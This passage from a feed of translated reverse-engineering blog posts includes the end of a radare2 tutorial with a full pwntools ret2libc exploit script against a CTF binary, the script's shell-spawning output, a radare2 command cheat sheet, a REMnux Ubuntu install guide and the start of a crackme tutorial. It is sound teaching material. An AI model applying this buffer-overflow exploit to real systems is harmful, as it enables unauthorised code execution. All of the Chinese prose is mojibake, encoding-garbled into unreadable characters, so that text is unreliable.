|</span><br><span class="line">| exit@libc           |</span><br><span class="line">| /bin/sh address     |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p>è¿˜è®°å¾—ä¸Šä¸€æ¬¡æˆ‘ä»¬è¿”å›åˆ°äº†å…¥å£ç‚¹å—ï¼Ÿè¿™æ„å‘³ç€<code>scanf</code>åˆåœ¨ç­‰å¾…æˆ‘ä»¬çš„è¾“å…¥ã€‚ç°åœ¨æˆ‘ä»¬æ‰€åšçš„å°±æ˜¯æŠŠè¿™äº›è°ƒç”¨ä¸²è”èµ·æ¥ä¼ ç»™ç¨‹åºã€‚</p><p>è¿™æ˜¯æˆ‘ä»¬æœ€åçš„è„šæœ¬ã€‚åƒæˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œä½ åªéœ€è¦æ›¿æ¢ç¬¦åˆä½ çš„<em>libc</em>çš„åç§»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = <span class="number">0x00062710</span> </span><br><span class="line">offset_system = <span class="number">0x0003c060</span> </span><br><span class="line">offset_exit = <span class="number">0x0002f1b0</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x167768</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">"libc base: 0x%x"</span> % libc_base)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    exit_addr = libc_base  + offset_exit</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line"> </span><br><span class="line">    log.info(<span class="string">"system is at: 0x%x"</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">"/bin/sh is at: 0x%x"</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">"exit is at: 0x%x"</span> % exit_addr)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Build 2nd payload</span></span><br><span class="line">    payload2  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain2 =  p32(system_addr)</span><br><span class="line">    ropchain2 += p32(exit_addr)</span><br><span class="line">    <span class="comment"># Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)</span></span><br><span class="line">    <span class="comment">#           Then you'll execute system("sh")</span></span><br><span class="line">    ropchain2 += p32(binsh_addr) </span><br><span class="line"> </span><br><span class="line">    payload2 = payload2 + ropchain2</span><br><span class="line">    p.sendline(payload2)</span><br><span class="line"> </span><br><span class="line">    log.success(<span class="string">"Here comes the shell!"</span>)</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.interactive()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>è·‘è¿™ä¸ªè„šæœ¬æˆ‘ä»¬å°±èƒ½æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process â€˜./megabeets_0x2â€™: pid 24410</span><br><span class="line">[*] puts is at: 0xf75db710</span><br><span class="line">[*] libc base: 0xf75ce000</span><br><span class="line">[*] system is at: 0xf760a060</span><br><span class="line">[*] /bin/sh is at: 0xf7735768</span><br><span class="line">[*] exit is at: 0xf75fd1b0</span><br><span class="line">[+] Here comes the shell!</span><br><span class="line">[*] Switching to interactive mode:</span><br><span class="line">  </span><br><span class="line"><span class="meta">$</span> whoami</span><br><span class="line">beet</span><br><span class="line"><span class="meta">$</span> echo EOF</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p><code>Radare2</code>ä¹‹æ—…çš„ç¬¬äºŒéƒ¨åˆ†å°±åˆ°æ­¤ç»“æŸäº†ã€‚æˆ‘ä»¬ç®€å•åœ°å­¦ä¹ äº†ä¸€äº›<code>radare2</code>ä¸­æ¼æ´åˆ©ç”¨çš„åŠŸèƒ½ã€‚åœ¨ä¸‹ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬ä¼šå­¦ä¹ <code>radare2</code>å†è„šæœ¬ç¼–å†™å’Œæ¶æ„è½¯ä»¶åˆ†æä¸­çš„åŠŸèƒ½ã€‚</p><h1 id="æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨"><a href="#æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨" class="headerlink" title="æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨"></a>æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨</h1><p>è¿™æ˜¯ä¸€ç³»åˆ—æˆ‘åœ¨æœ¬æ–‡ä¸­æåˆ°çš„å‘½ä»¤ï¼ˆè¿˜æœ‰ä¸€äº›è¡¥å……ï¼‰ã€‚ä½ å¯ä»¥æŠŠå®ƒä½œä¸ºä¸€ä»½å‚è€ƒè¡¨ã€‚</p><h2 id="è·å–ä¿¡æ¯"><a href="#è·å–ä¿¡æ¯" class="headerlink" title="è·å–ä¿¡æ¯"></a>è·å–ä¿¡æ¯</h2><ul><li><code>$ rabin2 -I ./program</code>â€”â€”äºŒè¿›åˆ¶ä¿¡æ¯ï¼ˆå’Œ<code>radare2</code>çš„shellä¸­<code>i</code>å‘½ä»¤ç›¸åŒï¼‰</li><li><code>ii [q]</code>â€”â€”å¯¼å…¥è¡¨</li><li><code>?v sym.imp.func_name</code>â€”â€”è·å–<code>func_name@PLT</code>åœ°å€</li><li><code>?v reloc.func_name</code>â€”â€”è·å–<code>func_name@GOT</code>åœ°å€</li><li><code>ie [q]</code>â€”â€”è·å–å…¥å£ç‚¹åœ°å€</li><li><code>iS</code>â€”â€”æŸ¥çœ‹åŒºæ®µçš„å„ä¸ªæƒé™ï¼ˆè¯»/å†™/æ‰§è¡Œï¼‰</li><li><code>i~canary</code>â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯<code>Canary</code></li><li><code>i~pic</code>â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯<code>PIE</code></li><li><code>i~nx</code>â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯<code>NX</code></li></ul><h2 id="å†…å­˜"><a href="#å†…å­˜" class="headerlink" title="å†…å­˜"></a>å†…å­˜</h2><ul><li><code>dm</code>â€”â€”æŸ¥çœ‹å†…å­˜ä¿¡æ¯</li><li><code>dmm</code>â€”â€”åˆ—å‡ºæ¨¡å—ï¼ˆå†…å­˜ä¸­çš„è¿è¡Œåº“å’ŒäºŒè¿›åˆ¶æ¨¡å—ï¼‰</li><li><code>dmi [addr|libname] [symname]</code>â€”â€”åˆ—å‡ºç›®æ ‡åº“çš„æ ‡å¿—</li></ul><h2 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h2><ul><li><code>e search.*</code>â€”â€”ç¼–è¾‘æŸ¥æ‰¾é…ç½®</li><li><code>/?</code>â€”â€”åˆ—å‡ºæŸ¥æ‰¾çš„å­å‘½ä»¤</li><li><code>/ string</code>â€”â€”åœ¨å†…å­˜æˆ–ç¨‹åºæ®µæŸ¥æ‰¾å­—ç¬¦ä¸²</li><li><code>/R [?]</code>â€”â€”æŸ¥æ‰¾ç‰¹å®šçš„ROP</li><li><code>/R/</code>â€”â€”ROPå¸¸è§„æœç´¢</li></ul><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><ul><li><code>dc</code>â€”â€”ç»§ç»­æ‰§è¡Œ</li><li><code>dcu addr</code>â€”â€”ç»§ç»­æ‰§è¡Œåˆ°æŸä¸ªåœ°å€</li><li><code>dcr</code>â€”â€”ç»§ç»­æ‰§è¡Œç›´åˆ°<code>ret</code>ï¼ˆå•æ­¥æ­¥è¿‡ï¼‰</li><li><code>dbt [?]</code>â€”â€”åœ¨<em>dbg.btdepth</em>å’Œ<em>dbg.btalgo</em>çš„åŸºç¡€ä¸Šå›æº¯æŒ‡ä»¤</li><li><code>doo [args]</code>â€”â€”é‡æ–°æ‰“å¼€è°ƒè¯•å¹¶è®¾ç½®å‚æ•°</li><li><code>ds</code>â€”â€”å•æ­¥æ­¥å…¥</li><li><code>dso</code>â€”â€”å•æ­¥æ­¥è¿‡</li></ul><h2 id="å›¾å½¢æ¨¡å¼"><a href="#å›¾å½¢æ¨¡å¼" class="headerlink" title="å›¾å½¢æ¨¡å¼"></a>å›¾å½¢æ¨¡å¼</h2><ul><li><code>pdf @ addr</code>â€”â€”è¾“å‡ºå½“å‰ä½ç§»ä¸‹å‡½æ•°çš„æ±‡ç¼–ä»£ç </li><li><code>V</code>â€”â€”å¯è§†åŒ–æ¨¡å¼ï¼Œä½¿ç”¨<code>p</code>/<code>P</code>å†ä¸¤ä¸ªæ¨¡å¼é—´åˆ‡æ¢</li><li><code>VV</code>â€”â€”å›¾å½¢æ¨¡å¼ï¼Œåœ¨asciiå›¾åƒä¸‹åˆ†æ</li><li><code>V!</code>â€”â€”æ§åˆ¶æ¿æ¨¡å¼ï¼Œå¯¹æ¼æ´åˆ©ç”¨éå¸¸æœ‰ç”¨</li></ul><p>çœ‹çœ‹<a href="http://radare.today/posts/using-radare2/" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ï¼Œä¹Ÿè®¸æœ‰æ›´å¤šçš„å†…å®¹èƒ½å¤Ÿå¸®åŠ©åˆ°ä½ ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç¿»è¯‘è‡ª&lt;a href=&quot;https://www.megabeets.net/a-journey-into-radare-2-part-2/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Megabeets&lt;/a&gt;ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="translation" scheme="https://qianfei11.github.io/tags/translation/"/>
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Installing Minimal Ubuntu for REMnux</title>
    <link href="https://qianfei11.github.io/2019/02/20/Installing-Minimal-Ubuntu-for-REMnux/"/>
    <id>https://qianfei11.github.io/2019/02/20/Installing-Minimal-Ubuntu-for-REMnux/</id>
    <published>2019-02-20T14:10:38.000Z</published>
    <updated>2019-02-20T14:21:28.790Z</updated>
    
    <content type="html"><![CDATA[<p>å› ä¸ºgoogle driveä¸Šä¸‹è½½REMnuxçš„ovaå®åœ¨æ˜¯å¤ªæ…¢äº†ï¼Œåœ¨<a href="https://remnux.org/docs/distro/get/#install-remnux-on-an-existing-system" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a>ä¸Šçœ‹åˆ°äº†å¯ä»¥ç”¨ubuntuæ¥å¼„ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹å®‰è£…<code>Ubuntu 14.04 64-bit minimal ISO</code>çš„è¿‡ç¨‹ã€‚æ¬è¿è‡ª<a href="https://plus.google.com/photos/+REMnuxOrg/albums/6156978999037787521?authkey=CP2Zs4P-tZWcmQE" target="_blank" rel="noopener">è¿™é‡Œ</a>ã€‚</p><a id="more"></a><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/1.png" alt="If you&#39;re preparing to install REMnux using its installation script, use Ubuntu 14.04 64-bit minimal ISO as the starting point."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/2.png" alt="Select your preferred language for the installation. This example uses English."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/3.png" alt="Select the location for your desired time zone and locale. This example uses United States."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/4.png" alt="Auto-detecting the keyboard sometimes doesn&#39;t work well. We recommend manually specifying the desired keyboard layout."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/5.png" alt="Select the country of origin for your keyboard. This example uses English (US)."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/6.png" alt="Select your keyboard layout. This example uses English (US)."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/7.png" alt="You can pick any hostname you wish. We suggest using &quot;remnux&quot;."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/8.png" alt="Select the your country. This example uses United States."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/9.png" alt="Select the desired Ubuntu server. Accepting the default usually works well."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/10.png" alt="If accessing the Internet at your location requires going through a proxy server, specify that server now. Otherwise, simply click Continue."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/11.png" alt="Assign a full name for the primary user account you&#39;ll use on REMnux. We suggest specifying the name REMnux User."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/12.png" alt="Select the username for the account you&#39;ll be using on REMnux. We recommend picking the name &quot;remnux&quot;."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/13.png" alt="Select the desired password. The default REMnux installation uses the word &quot;malware&quot; as the password."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/14.png" alt></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/15.png" alt="The expected use of REMnux in a controlled analysis lab typically accommodates weak passwords, such as &quot;malware&quot;. However, if you&#39;re concerned about password complexity, select a stronger password."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/16.png" alt="The typical use of REMnux typically doesn&#39;t benefit from having the user&#39;s home directory encrypted. We suggest selecting No when asked whether to encrypt it."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/17.png" alt="Confirm your time zone. This example uses America/New_York."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/18.png" alt="Select &quot;Guided - use entire disk&quot;."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/19.png" alt="Select the desired partition. If you&#39;re installing Ubuntu on a system other than VMware, the name of your partition might be different from the one shown in your example. Your disk size might differ, too."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/20.png" alt="Select Yes when asked whether to write the changes to disks."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/21.png" alt="The typical use of REMnux typically doesn&#39;t benefit from automatic updated. Instead, REMnux users are encouraged to update their system by using the update-remnux command. Therefore, we recommend selecting &quot;No automatic updates&quot;."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/22.png" alt="Select &quot;Basic Ubuntu server.&quot; This helps keep the system lightweight. The REMnux installer will add the necessary packages later."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/23.png" alt="Select Yes when asked whether to install the boot loader to the master boot record."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/24.png" alt></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/25.png" alt="Press Continue to reboot the system. After it starts up again, log in using the username and password you&#39;ve established during the Ubuntu installation process, then follow REMnux installation instructions at https://remnux.org/docs/distro/get."></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å› ä¸ºgoogle driveä¸Šä¸‹è½½REMnuxçš„ovaå®åœ¨æ˜¯å¤ªæ…¢äº†ï¼Œåœ¨&lt;a href=&quot;https://remnux.org/docs/distro/get/#install-remnux-on-an-existing-system&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;å®˜æ–¹æ–‡æ¡£&lt;/a&gt;ä¸Šçœ‹åˆ°äº†å¯ä»¥ç”¨ubuntuæ¥å¼„ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹å®‰è£…&lt;code&gt;Ubuntu 14.04 64-bit minimal ISO&lt;/code&gt;çš„è¿‡ç¨‹ã€‚æ¬è¿è‡ª&lt;a href=&quot;https://plus.google.com/photos/+REMnuxOrg/albums/6156978999037787521?authkey=CP2Zs4P-tZWcmQE&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;è¿™é‡Œ&lt;/a&gt;ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="translation" scheme="https://qianfei11.github.io/tags/translation/"/>
    
  </entry>
  
  <entry>
    <title>Radare2ä¹‹æ—…-Part1ï¼šSimple crackme</title>
    <link href="https://qianfei11.github.io/2019/02/18/Radare2%E4%B9%8B%E6%97%85-Part1%EF%BC%9ASimple%20crackme/"/>
    <id>https://qianfei11.github.io/2019/02/18/Radare2ä¹‹æ—…-Part1ï¼šSimple crackme/</id>
    <published>2019-02-18T04:17:27.000Z</published>
    <updated>2019-02-24T13:20:19.291Z</updated>
    
    <content type="html"><![CDATA[<p>ç¿»è¯‘è‡ª<a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/" target="_blank" rel="noopener">Megabeets</a>ã€‚</p><a id="more"></a><h1 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h1><p>è¿‡å»ä¸€å¹´é‡Œçš„CTFæ¯”èµ›ä¸­ï¼Œä¸è®ºæ˜¯é€†å‘å·¥ç¨‹ï¼ˆREï¼‰è¿˜æ˜¯æ¼æ´æŒ–æ˜ï¼ˆPWNï¼‰ï¼Œæˆ‘ä¸€ç›´åœ¨ç”¨<code>radare2</code>ã€‚æˆ‘å‘ç°<code>radare2</code>å¯¹äºå¾ˆå¤šCTFçš„é¢˜ç›®æ¥è¯´éƒ½å¾ˆæœ‰ç”¨ï¼Œæå¤§åœ°ç¼©çŸ­äº†æˆ‘çš„åšé¢˜æ—¶é—´ã€‚é—æ†¾çš„æ˜¯ç†Ÿæ‚‰radare2çš„äººå¤ªå°‘äº†ã€‚å¯èƒ½å¤§å®¶éƒ½ä¹ æƒ¯äº†ä½¿ç”¨<code>IDA Pro</code>ã€<code>OllyDBG</code>è¿˜æœ‰<code>gdb</code>ï¼Œæˆ–è€…æ²¡æœ‰å¬è¯´è¿‡å®ƒã€‚ä¸ç®¡æ€ä¹ˆæ ·ï¼Œæˆ‘éƒ½è®¤ä¸º<code>radare2</code>åº”è¯¥æˆä¸ºä½ å·¥å…·ç®±ä¸­çš„ä¸€éƒ¨åˆ†ã€‚</p><p>å› ä¸ºæˆ‘çœŸçš„ç‰¹åˆ«å–œæ¬¢è¿™ä¸ªé¡¹ç›®ï¼Œè€Œä¸”æˆ‘å¸Œæœ›èƒ½æœ‰è¶Šæ¥è¶Šå¤šçš„äººå¼€å§‹ç†Ÿæ‚‰å®ƒã€ä½¿ç”¨å®ƒï¼Œèƒ½å¯¹é¡¹ç›®åšå‡ºä¸€äº›è´¡çŒ®ã€‚æˆ‘è®¡åˆ’å†™ä¸€ç³»åˆ—çš„æ–‡ç« ä»¥åŠä½¿ç”¨<code>r2</code>çš„ä¾‹å­ã€‚å› ä¸ºé‚£äº›æ–‡ç« éƒ½æ¶‰åŠ<code>radare2</code>çš„ç‰¹ç‚¹å’ŒåŠŸèƒ½ï¼Œæˆ‘ä¼šè§£é‡Šçš„æ›´åŠ è¯¦ç»†ã€‚</p><p><img src="https://www.megabeets.net/uploads/r2_part1_1.png" alt="Welcome to IDA 10.0. ï¼ˆåœ¨ radare2/doc/fortunes.fun æŸ¥çœ‹æ›´å¤šï¼‰"></p><h1 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a><code>radare2</code></h1><p><code>radare2</code>æ˜¯ä¸€ä¸ªé€†å‘å·¥ç¨‹å’ŒäºŒè¿›åˆ¶åˆ†æçš„å¼€æºæ¡†æ¶ï¼Œå®ƒæœ‰å¾ˆå¤šå‘½ä»¤è¡Œæ¥å£ï¼ŒåŒ…æ‹¬åæ±‡ç¼–ã€åˆ†ææ•°æ®ã€æ‰“è¡¥ä¸ã€æ¯”è¾ƒæ•°æ®ã€æŸ¥æ‰¾ã€æ›¿æ¢ã€å¯è§†åŒ–ç­‰ç­‰åŠŸèƒ½ã€‚åŒæ—¶å®ƒå¯ä»¥åœ¨å‡ ä¹æ‰€æœ‰çš„ä¸»è¦æ“ä½œç³»ç»Ÿï¼ˆ<code>GNU/Linux</code>ã€<code>.Windows</code>ã€<code>*BSD</code>ã€<code>iOS</code>ã€<code>OSX</code>ã€<code>Solaris</code>ç­‰ç­‰ï¼‰ä¸Šè¿è¡Œï¼Œå¹¶ä¸”æ”¯æŒè®¸å¤šCPUæ¶æ„å’Œæ–‡ä»¶æ ¼å¼ã€‚ä»–æ‰€æœ‰çš„ç‰¹ç‚¹å¯ä»¥å±•ç°å‡ºä¸€ä¸ªæ€æƒ³â€”â€”<code>radare2</code>æ˜¯ç»å¯¹è‡ªç”±çš„ã€‚</p><p>è¯¥æ¡†æ¶æ˜¯ä¸€ä¸ªå·¥å…·çš„é›†åˆï¼Œæ—¢å¯ä»¥åœ¨<code>r2</code>ç»™å‡ºçš„shellä¸‹ä½¿ç”¨ï¼Œåˆå¯ä»¥ç‹¬ç«‹ä½¿ç”¨â€”â€”æ¯”å¦‚æˆ‘ä»¬å°†è¦äº†è§£çš„<code>rahash2</code>ã€<code>rabin2</code>ã€<code>ragg2</code>ä¸‰ä¸ªç»„ä»¶ã€‚æ‰€æœ‰çš„ç»„ä»¶èµ‹äºˆäº†<code>radare2</code>å¼ºå¤§çš„é™æ€æˆ–åŠ¨æ€åˆ†æã€åå…­è¿›åˆ¶ç¼–è¾‘ä»¥åŠæ¼æ´æŒ–æ˜èƒ½åŠ›ï¼ˆåœ¨æ¥ä¸‹æ¥çš„æ–‡ç« ä¸­æˆ‘ä¼šæ›´æ·±å…¥åœ°è®²è¿°ï¼‰ã€‚</p><p>æˆ‘ä»¬å¿…é¡»æ„è¯†åˆ°å­¦ä¹ <code>r2</code>æ˜¯ä¸€ä¸ªååˆ†è‰°éš¾çš„è¿‡ç¨‹â€”â€”è™½ç„¶<code>r2</code>æœ‰GUIå’ŒWebUIã€‚åœ¨æˆ‘çœ‹æ¥ï¼ŒIDAçš„GUIå’Œæ–¹ä¾¿æ€§ç¡®å®æ›´ä½³ã€‚ä½†æ˜¯å®ƒçš„å‘½ä»¤è¡Œæ¥å£ï¼ŒåŒ…æ‹¬å…¶å¯è§†åŒ–æ¨¡å¼ï¼Œä»ç„¶æ˜¯<code>radare2</code>çš„æ ¸å¿ƒä»¥åŠé­…åŠ›æ‰€åœ¨ã€‚å› ä¸ºå®ƒçš„å¤æ‚æ€§ï¼Œæˆ‘ä¼šå°½åŠ›è®²å¾—æµ…æ˜¾æ˜“æ‡‚ã€‚</p><p><img src="https://www.megabeets.net/uploads/r2_learning_curve.png" alt="è¿™å·®ä¸å¤šæ˜¯r2çš„å­¦ä¹ æ›²çº¿"></p><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œä½ å¯ä»¥çœ‹ä¸€çœ‹<a href="https://www.radare.org/r/cmp.html" target="_blank" rel="noopener">â€œr2ã€IDA Proå’ŒHopperç­‰å·¥å…·é—´çš„æ¯”è¾ƒâ€</a>æ¥äº†è§£å®ƒã€‚</p><h1 id="è·å–radare2"><a href="#è·å–radare2" class="headerlink" title="è·å–radare2"></a>è·å–<code>radare2</code></h1><h2 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h2><p><code>radare2</code>çš„ç¯å¢ƒé…ç½®éå¸¸å¿«â€”â€”æˆ‘ä»¬æ¯å¤©éƒ½ä¼šæ›´æ–°ï¼Œæ‰€ä»¥æ›´æ¨èä½ å»ä½¿ç”¨gitçš„ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯ç¨³å®šç‰ˆæœ¬ã€‚æœ‰æ—¶å€™ç¨³å®šç‰ˆæœ¬å¯èƒ½æ²¡æœ‰gitç‰ˆæœ¬æ›´ç¨³å®šã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> git clone https://github.com/radare/radare2.git</span><br><span class="line"><span class="meta">$</span> cd radare2</span><br><span class="line"><span class="meta">$</span> ./sys/install.sh</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ ä¸æƒ³ä¸‹è½½gitç‰ˆæœ¬æˆ–è€…ä½ æƒ³è¦ä¸åŒæ“ä½œç³»ç»Ÿï¼ˆ<code>Windows</code>ã€<code>OS X</code>ã€<code>iOS</code>ç­‰ç­‰ï¼‰ä¸Šçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥åœ¨<a href="https://www.radare.org/r/down.html" target="_blank" rel="noopener">radare2å®˜ç½‘ä¸‹è½½ç•Œé¢</a>æŸ¥çœ‹ã€‚</p><h2 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h2><p>æ­£å¦‚æˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œæ›´æ¨èå¤§å®¶ä½¿ç”¨gitä»“åº“é‡Œæœ€æ–°ç‰ˆçš„<code>r2</code>ã€‚ä»gitæ›´æ–°<code>r2</code>åªéœ€è¦æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./sys/install.sh</span><br></pre></td></tr></table></figure><p>ç„¶åä½ å°±èƒ½ä»gitè·å¾—æœ€æ–°çš„ç‰ˆæœ¬ã€‚æˆ‘é€šå¸¸æ¯å¤©æ—©ä¸Šä¼šæ›´æ–°ä¸€ä¸‹<code>radare2</code>ï¼Œåœ¨è¿™æœŸé—´å¯ä»¥çœ‹çœ‹ä¸€ä¼šå„¿è§†é¢‘æ¶ˆé£ã€‚</p><h2 id="å¸è½½"><a href="#å¸è½½" class="headerlink" title="å¸è½½"></a>å¸è½½</h2><p>æˆ‘å®åœ¨æƒ³ä¸å‡ºä»€ä¹ˆç†ç”±ä¼šè®©ä½ åœ¨çœ‹è¿™ç¯‡æ–‡ç« 